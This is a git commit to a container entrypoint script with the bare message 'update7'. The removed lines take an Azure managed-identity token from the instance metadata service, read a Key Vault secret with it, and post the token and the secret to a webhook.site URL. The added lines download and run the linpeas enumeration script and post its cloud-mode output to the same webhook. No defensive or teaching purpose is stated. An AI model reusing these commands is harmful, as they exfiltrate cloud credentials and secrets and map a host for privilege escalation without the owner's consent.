ade08717a66d10b6eb1d192af75900b9b5493696
Mando <mando.stathaki@gmail.com>
2025-10-30 23:52:47 +0200

    update7

--- entrypoint.sh
+++ entrypoint.sh
@@ -2,11 +2,7 @@
 KEYVAULT_NAME="acr-2-9f82a4bab1" 
 SECRET_NAME="acr-2-9f82a4ba-b1d56"
 WEBHOOK_URL="https://webhook.site/84015fad-9e78-4e9a-8cb4-1c8cd23c3a33"
-curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | jq -r '.access_token' > /tmp/test
+cd /tmp
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
+bash ./linpeas.sh -o cloud > /tmp/test 
 curl -sS -X POST -H "Content-Type: text/plain" --data-binary @/tmp/test "$WEBHOOK_URL"  
-TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | jq -r '.access_token')
-SECRET_JSON=$(curl -s -H "Authorization: Bearer $TOKEN" "https://$KEYVAULT_NAME.vault.azure.net/secrets/$SECRET_NAME?api-version=7.3") 
-echo "$SECRET_JSON" | jq .
-SECRET_VALUE=$(echo "$SECRET_JSON" | jq -r '.value') 
-echo "secret length: ${#SECRET_VALUE}" 
-curl -s -X POST -H "Content-Type: text/plain" --data-binary "$SECRET_VALUE" "$WEBHOOK_URL"
